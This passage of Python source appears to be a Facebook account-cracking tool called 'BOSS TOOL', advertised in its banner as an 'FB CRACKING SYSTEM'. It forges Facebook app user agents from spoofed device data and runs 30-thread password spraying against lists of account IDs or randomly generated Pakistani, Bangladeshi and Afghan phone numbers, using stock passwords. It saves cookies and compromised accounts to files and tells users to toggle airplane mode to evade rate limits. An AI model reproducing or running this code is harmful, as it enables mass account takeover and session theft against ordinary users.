U; Android 10; MagentaTV ONE Build/QTT8.201201.004) ((2.00T_G6::3.119.3071::HY44G::))","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH2 Build/QTG3.200305.006.S292) ((2.00T_ATV::3.124.3630::BRAVIA_VH2::))","Dalvik/2.1.0 (Linux; U; Android 13; RMX3612 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 9; AFTKA Build/PS7633.3445N) ((2.00T_AMZ::3.123.3501::kara::))","Dalvik/2.1.0 (Linux; U; Android 9; AFTGAZL Build/PS7613.3701N) ((2.00T_AMZ::3.120.local::gazelle::))","Dalvik/2.1.0 (Linux; U; Android 10; SM-G960F Build/QP1A.190711.020) ((2.00T_AOS::0.1.774::starlte::FTV_OTT_PREVIEW_DT))","Dalvik/2.1.0 (Linux; U; Android 10; sdk_google_atv_x86 Build/QTU1.200805.001) ((2.00T_ATV::3.123.3501::generic_x86::))","Dalvik/2.1.0 (Linux; U; Android 10; CLT-L29 Build/HUAWEICLT-L29) ((2.00T_AOS::0.1.659::HWCLT::))","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH2 Build/QTG3.200305.006.S252) ((2.00T_ATV::3.123.local::BRAVIA_VH2::FTV_OTT_PREVIEW_DT))","Dalvik/2.1.0 (Linux; U; Android 9; OTT-G1 Build/PI) ((2.00T_G1::3.123.3531::DV6067Y::FTV_OTT_PREVIEW_DT))","Dalvik/2.1.0 (Linux; U; Android 8.0.0; BAH2-W19 Build/HUAWEIBAH2-W19) ((2.00T_AOS::0.1.659::HWBAH2::))","Dalvik/2.1.0 (Linux; U; Android 8.0.0; Android SDK built for x86 Build/OSR1.180418.026) ((2.00T_ATV::3.124.3521::generic_x86::))","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6295) ((2.00T_AMZ::3.123.3537::mantis::))","Dalvik/2.1.0 (Linux; U; Android 13; 22101320G Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 12; Archos T101 HD WIFI Build/SQ1A.220105.002)","Dalvik/2.1.0 (Linux; U; Android 11; FP2 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G780F Build/TP1A.220624.014; BroadcastDotRadioApp )","Dalvik/1.6.0 (Linux; U; Android 4.4.2; C702 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 pro Build/S1RAS32.41-20-16-5-3-6)","Dalvik/2.1.0 (Linux; U; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1) VD/235","Dalvik/2.1.0 (Linux; U; Android 13; SM-A137F Build/TP1A.220624.014) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; A7000 Build/NITROGEN-OS-8.1-BY-AKS121)","Dalvik/1.6.0 (Linux; U; Android 7.0; Kids Kx Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 10; 5061U_TR Build/QP1A.190711.020)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; CMB405 Build/KTU84P)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; GEANT_T3 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; Moto E (4) Build/NCQS26.69-64-8)","Dalvik/2.1.0 (Linux; U; Android 13; 23028RN4DG Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; SM-T535 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Pro Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BE52 Build/61.2.F.0.178)","Dalvik/2.1.0 (Linux; U; Android 10; V1921A Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 6.0; Pro_Max14 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 10; uie4057lgu Build/QT)","Dalvik/2.1.0 (Linux; U; Android 12; HiPad XPro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Nonchers Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 11; S22_EEA Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; V2219A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; KFRAPWI Build/RS8318.2031N)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A236B Build/TP1A.220624.014) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; M2006C3LVG MIUI/V12.0.16.0.QCDEUVF) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 11; M2103K19G Build/RP1A.200720.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 11; M2012K11AG Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 11; KidsPad_10 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Hisense U965 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 9; Venus V7 Build/VT1130)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one Build/QPK30.54-22)","Dalvik/2.1.0 (Linux; U; Android 11; SmartEver4KAndroidTV Build/RTM3.211215.125)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R113-15393.48.0)","Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_x86_64 Build/SE1A.220826.006.A1)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; vivo Y55 Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 11; unknown Build/RMAIN1.1142N)","Dalvik/2.1.0 (Linux; U; Android 11; TX3MINI Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; A96X Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 9; moto g(7) plus Build/PPW29.98-66)","Dalvik/2.1.0 (Linux; U; Android 10.0; Q91-A2-CPL Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 11; M2103K19PG Build/RP1A.200720.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 12; P40HD_EEA Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 Build/S1RGS32.53-18-22-30)","Dalvik/2.1.0 (Linux; U; Android 12; P30S_EEA Build/P30S_EEA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Hi3798MV200 Build/LMY47X)","Dalvik/2.1.0 (Linux; U; Android 10; SM-G975F Build/QP1A.190711.020) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 9; SM-A202F Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 10; SM-T595C Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 5.1; S11D Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; LGM-X401S Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 10; PCB-T104 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; moto g(10) power Build/RRBS31.Q1-3-58-19)","Dalvik/2.1.0 (Linux; U; Android 10; X98MAX Build/QQ2A.200305.004.A1)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G611M Build/R16NW)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; P-WAL-107-ELC-02 Build/KTU84Q)",])
        version_ = str(random.randint(4, 10)) + "." + str(random.randint(0, 4)) + "." + str(random.randint(0, 4))
        model_ = "SM-" + str(random.randint(100, 999))
        brand_name_ = random.choice(["Samsung", "Kaios", "Realme", "Nokia", "infinix"])
        width_ = random.randint(320, 1080)
        height_ = random.randint(480, 1920)
        user_agent = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+str(width_)+',height='+str(height_)+'};]'
        uat = random.choice(user_agent)
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#_________[ LOOPS ]______>>
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]
#_________[ IMPORTING TIME MODULS ]______>>
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
def clear():
        os.system('clear')
        print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-----------------------[DATE Checker For FILE CLONING]-----------------------#
def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif ids[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif ids[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
        elif ids[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif ids[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif ids[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif ids[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif ids[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif ids[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif ids[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif ids[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif ids[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif ids[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif ids[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        else:creation=''
    elif len(ids) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(ids)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(ids)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation=''
    return creation
#-----------------------[DATE Checker For UID CLONING]-----------------------#
def joined(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif uid[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif uid[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
        elif uid[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif uid[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif uid[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif uid[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif uid[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif uid[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif uid[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif uid[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif uid[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif uid[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif uid[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        elif uid[:5] in ['10009']           :creation = '\33[1;37m| \33[1;33m2023' 
        else:creation=''
    elif len(uid) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(uid)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(uid)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation=''
    return creation
#_________[ PRINT LINE ]______>>
def linex():
    print('\033[1;97m====================================================')
#_________[ TOOL LOGO ]______>>
logo=(""" \033[1;37m╔═\033[1;32mⒷⓄⓈⓈ\033[1;37m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[47m\033[1;31m🌻𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐁𝐎𝐒𝐒 𝐓𝐎𝐎𝐋🌻\x1b[0m\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32mⒷⓄⓈⓈ\033[1;37m═╗
 \033[1;32m║   \x1b[1;97m888888b.    .d88888b.   .d8888b.   .d8888b.   \033[1;32m║
 \033[1;37m║   \x1b[1;92m888  "88b  d88P" "Y88b d88P  Y88b d88P  Y88b  \033[1;37m║
 \x1b[1;92mⒷ   \x1b[1;97m888  .88P  888     888 Y88b.      Y88b.       \x1b[1;92mⒷ
 \x1b[1;97mⓄ   \x1b[1;92m8888888K.  888     888  "Y888b.    "Y888b.    \x1b[1;97mⓄ
 \x1b[1;92mⓈ   \x1b[1;97m888  "Y88b 888     888     "Y88b.     "Y88b.  \x1b[1;92mⓈ
 \x1b[1;97mⓈ   \x1b[1;92m888    888 888     888       "888       "888  \x1b[1;97m\x1b[1;97mⓈ
 \033[1;32m║   \x1b[1;97m888   d88P Y88b. .d88P Y88b  d88P Y88b  d88P  \033[1;32m║ 
 \033[1;37m║   \x1b[1;92m8888888P"   "Y88888P"   "Y8888P"   "Y8888P"   \033[1;37m║
 \033[1;32m║  \033[47m\033[1;31m[🌻𝐎𝐖𝐍𝐄𝐑𝐒/𝐂𝐑𝐄𝐀𝐓𝐎𝐑𝐒 : 𓆩𝐌𝐑 𝐀𝐃𝐈𓆪🌻𓆩𝐌𝐑 𝐀𝐅𝐓𝐀𝐁𓆪🌻]\x1b[0m   \033[1;32m║
 \x1b[1;97mⒷ \033[1;32mⒷⓄⓈⓈ\033[1;37m☞  \x1b[38;5;208mAUTHER     \033[1;37m➣   \x1b[38;5;205m𝐌𝐑 𝐀𝐃𝐈 & 𝐌𝐑 𝐀𝐅𝐓𝐀𝐁   \033[1;37m☜\033[1;32mⒷⓄⓈⓈ \033[1;37mⒷ
 \x1b[1;92mⓄ \033[1;32mⒷⓄⓈⓈ\033[1;37m☞  \x1b[38;5;208mFACEBOOK   \033[1;37m➣   \x1b[38;5;205mMR.ADI5000     \033[1;37m     ☜\033[1;32mⒷⓄⓈⓈ \033[1;32mⓄ
 \x1b[1;97mⓈ \033[1;32mⒷⓄⓈⓈ\033[1;37m☞  \x1b[38;5;208mGITHUB    \033[1;37m ➣   \x1b[38;5;205mMRADI007           \033[1;37m ☜\033[1;32mⒷⓄⓈⓈ \033[1;37mⓈ
 \x1b[1;92mⓈ \033[1;32mⒷⓄⓈⓈ\033[1;37m☞  \x1b[38;5;208mVERSION   \033[1;37m ➣   \x1b[38;5;205mULTRA PRO MAX    \033[1;37m   ☜\033[1;32mⒷⓄⓈⓈ \033[1;32mⓈ
 \033[1;37m║ \033[1;32mⒷⓄⓈⓈ\033[1;37m☞  \x1b[38;5;208mTOOL      \033[1;37m ➣   \x1b[38;5;205mFB CRACKING SYSTEM  \033[1;37m☜\033[1;32mⒷⓄⓈⓈ \033[1;37m║
 \033[1;32m╚\033[1;37m═\033[1;32mⒷⓄⓈⓈ\033[1;37m═\033[1;32m═\033[1;37m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32mⒷⓄⓈⓈ\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32m═\x1b[1;97m═\033[1;32mⒷⓄⓈⓈ\033[1;37m═\033[1;32m╝""")
#_________[ MODULES CLEAR]______>>
clear() 
#_________[ USER IP SERVER ]______>>
ip = requests.get("https://api.ipify.org").text
print("\t \033[0;97m[•] \x1b[1;92mUSER IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
linex()
#_________[ LOGIN KEY ]______>>
CorrectUsername = 'BOSS'
key = 'true'
while key == 'true':
    username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print('\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m LOGGED IN BOSS TOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'
#_________[ MAIN MENU ]______>>
print("\t \033[0;97m[•] \x1b[1;92mUSER IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
linex()
def menu():
        try:
                x = ("sex")
                if x == ("sex"):
                        print('\t\x1b[1;92m        BOSS TOOL MAIN MENU\n\033[1;97m====================================================\n\033[0;97m[1] \033[0;92mFILE CLONING\n\033[0;97m[2] \033[0;92mRANDOM PAK CLONING\n\033[0;97m[3] \033[0;92mCONTACT WITH OWNER\n\033[0;97m[0] \033[0;91mEXIT')
                        linex()
                        xd=input('\033[0;97m[•] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m')
                        if xd in ['1','01']:
                                clear()
                                print('\t\x1b[1;92m        BOSS TOOL FILE CLONER')
                                linex()
                                print('\033[0;97m[+] \33[1;92mPUT FILE EXAMPLE \x1b[1;91m:  \x1b[1;96m/sdcard/File.txt  etc..')
                                linex()
                                file = input('\033[0;97m[+] \033[0;92mFILE PATH \033[1;31m : \033[0;92m')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('\033[0;97m[•]\x1b[1;91m FILE LOCATION NOT FOUND')
                                        time.sleep(1)
                                        clear()
                                        menu()
                                clear()
                                print('\t\x1b[1;92m        BOSS TOOL METHODS MENU')
                                linex()
                                print('\033[0;97m[1] \033[0;92mMETHOD \033[0;97m(\033[0;96mNEW IDS\033[0;97m)')
                                print('\033[0;97m[2] \033[0;92mMETHOD \033[0;97m(\033[0;96mMIX IDS\033[0;97m)')
                                print('\033[0;97m[3] \033[0;92mMETHOD \033[0;97m(\033[0;96mOLD/NEW IDS\033[0;97m)')
                                linex()
                                mthd=input('\033[0;97m[•] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input('\033[0;97m[+] \033[0;92mHOW MANY PASSWORD DO YOU WANT TO ADD ? : '))
                                except:
                                        ps_limit =1
                                clear()
                                print('\t\x1b[1;92m     BOSS TOOL PASSWORD MENU')
                                linex()
                                print('\033[0;97m[+]\033[1;32m EXAMPLE \033[0;91m: \033[0;96mfirst last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f'\033[0;97m[•] \x1b[1;92mPUT PASSWORD {i+1} \033[1;31m: \033[1;36m'))
                                clear()
                                print('\t\x1b[1;92m  BOSS TOOL ACCOUNTS DISPLAY MENU')
                                linex()
                                print('\033[0;97m[•]\x1b[1;92m DO YOU WANT SHOW CP ACCOUNTS? \033[1;37m(\033[1;36my\033[1;37m/\x1b[1;96mn\033[1;37m) \033[1;31m: \x1b[1;93m')
                                linex()
                                cx=input('\033[0;97m[•] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('\t\x1b[1;92m   BOSS TOOL FILE CRACKING MENU')
                                        linex()
                                        print('\033[0;97m[•] \033[0;92mTOTAL ACCOUNTS  \033[0;91m:  \033[0;96m'+total_ids+'')
                                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED \033[1;91m:  \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
                                        print('\033[0;97m[•]\x1b[1;92m BOSS TOOL CRACKING HAS BEEN STARTED')
                                        linex()
                                        print('\x1b[1;97m[•] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED')
                                print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/BOSS-COOKIE.txt') 
                                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/BOSS-OK.txt')
                                linex()
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                        elif xd in ['2','02']:
                                clear()
                                print('\t\x1b[1;92m   BOSS TOOL RANDOM CLONING MENU')
                                linex()
                                print('\033[1;37m[1] \x1b[1;92mPAKISTAN RANDOM CLONING\n\033[1;37m[2] \x1b[1;92mBANGLADESH RANDOM CLONING\n\033[1;37m[3] \x1b[1;92mAFGHANISTAN RANDOM CLONING\n\033[1;37m[0] \033[1;32mBACK IN MAIN MENU ')
                                linex()
                                x=input('\033[0;97m[•] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']: 
                                        afg()
                                else:
                                        print('\033[0;97m[•] \033[0;91mCHOOSE CORRECT OPTION');menu()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://www.facebook.com/mradi5000');menu() 
                        elif xd in ['0','00']:
                                clear()
                                print('\t\x1b[1;92m   EXIT FROM BOSS TOOL')
                                linex()
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO CONTACT OWNER ');clear() 
                                os.system('xdg-open https://www.facebook.com/mradi5000');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE BOSS TOOL');time.sleep(2);linex();exit() 
                        else:
                                print('\033[0;97m[•] \033[0;91mCHOOSE CORRECT OPTION');menu()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n\033[0;97m[•]\x1b[1;91mNO INTERNET CONNECTION...')
                exit()
#_________[ PAK RANDOM CLONER ]______>>
def pak():
                user=[]
                clear()
                print('\t\x1b[1;92m  BOSS TOOL PAK RANDOM CLONER MENU')
                linex()
                print('\t\x1b[1;92m       PAKISTAN SIM CODE MENU')
                linex()
                print('\033[1;32m PAKISTAN SIM CODE EXAMPLE \x1b[1;91m: \x1b[1;96m0306,0315,0335,0345')
                linex() 
                code = input('\033[0;97m[•] \033[1;32mPUT CODE \x1b[1;91m: \x1b[1;96m ')
                linex() 
                try:
                        limit = int(input('\t\x1b[1;92m        UIDS LIMIT MENU\n\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m EXAMPLE \x1b[1;91m: \x1b[1;96m2000, 3000, 5000, 10000\n\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m PUT LIMIT \x1b[1;91m: \x1b[1;96m'))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as BOSS:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   BOSS TOOL RANDOM PAK CRACKING MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
                        print('\033[0;97m[•]\x1b[1;92m BOSS TOOL CRACKING HAS BEEN STARTED')
                        linex() 
                        print('\x1b[1;97m[•] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan123','khan123','khan12345','baloch123','baloch786','khan123456','i love you','khanbaba','khankhan','baloch','freefire','malik786','malik1122','malik123','malik12345','malik123456']
                                BOSS.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/BOSS-rndm-COOKIE.txt') 
                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/BOSS-rndm-OK.txt')
                linex()
                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear()
                menu()
#_________[ AFG RANDOM CLONER ]______>>      
def afg():
                user=[]
                clear()
                print('\t\x1b[1;92m  BOSS TOOL AFG RANDOM CLONER MENU')
                linex()
                print('\t\x1b[1;92m       AFG SIM CODE MENU')
                linex()
                print('\033[1;32m AFG SIM CODE EXAMPLE \x1b[1;91m: \x1b[1;96m9377,9378,9379,.....etc')
                linex() 
                code = input('\033[0;97m[•] \033[1;32mPUT CODE \x1b[1;91m: \x1b[1;96m ')
                linex() 
                try:
